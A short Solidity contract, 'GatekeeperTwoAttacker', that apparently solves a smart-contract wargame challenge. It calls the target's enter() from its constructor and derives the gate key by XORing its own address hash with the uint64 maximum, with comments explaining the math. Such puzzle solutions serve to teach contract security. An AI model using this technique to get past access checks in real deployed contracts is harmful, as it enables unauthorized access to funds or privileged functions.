// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    IGatekeeperTwo private gateKeeperTwo;

    constructor(address _gateKeeperTwoAddress) {
        gateKeeperTwo = IGatekeeperTwo(_gateKeeperTwoAddress);

        bytes8 gateKey = createGateKey();

        gateKeeperTwo.enter(gateKey);
    }

    function createGateKey() private view returns (bytes8) {
        // A = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))
        // B = uint64(_gateKey)
        // C = type(uint64).max
        // A ^ B = C => B = A ^ C
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                uint64(type(uint64).max)
        );

        return gateKey;
    }
}
